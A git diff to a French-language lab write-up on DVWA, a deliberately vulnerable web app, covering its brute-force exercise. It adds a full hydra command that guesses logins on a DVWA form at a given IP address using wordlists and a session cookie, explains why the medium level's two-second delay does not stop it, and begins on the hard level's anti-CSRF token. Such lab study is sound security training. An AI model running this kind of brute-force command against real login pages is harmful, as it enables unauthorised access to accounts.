@@ -606,7 +606,33 @@ On trouve le login qui est `admin` et le password `password`.
 
 Cette fois ci, on utilise une wordlist aussi pour les identifiants 
 ```
- hydra -L /opt/wordlist/wordlists/wordlists/usernames/cirt_default_usernames.txt -P /opt/wordlist/wordlists/wordlists/passwords/most_used_passwords.txt 34.163.97.167 http-get-form "/DVWA/vulnerabilities/brute/index.php:username=^USER^&password=^PASS^&Login=Login:H=Cookie:PHPSESSID=bnk7pa0fohd54o1l6orc5624ko; security=low:F=Username and/or password incorrect."
+hydra -L /opt/wordlists/wordlists/languages/english.txt -P /opt/wordlists/wordlists/passwords/password.txt 34.163.97.167 http-get-form "/DVWA/vulnerabilities/brute/index.php:username=^USER^&password=^PASS^&Login=Login:H=Cookie:PHPSESSID=dvkdo50vcgtak32lhhadgk8rvs; security=medium:F=Username and/or password incorrect."
+```
+Cependant, cela marche toujours puisque le code ne bloque pas les requêtes ou ne les filtre pas non plus il ajoute seulement un délai de 2 secondes entre chaque requêtes
+```php
+<?php
+...
+    }
+    else {
+        // Login failed
+        sleep( 2 );
+        echo "<pre><br />Username and/or password incorrect.</pre>";
+    }
+
+    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
+}
+
+?>
+```
+On le voit dans le code source dans la balise `else`. Donc le programme prendra plus de temps mais ultimement ca ne change rien au bruteforce
+
+# 4.3 Troisieme niveau - hard
+
+Quand on regarde le code source du troisieme niveau on remarque une ligne de code différente
+```php
+if( isset( $_GET[ 'Login' ] ) ) {
+    // Check Anti-CSRF token
+    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );
 ```
 
 # 5. DOM Based XSS
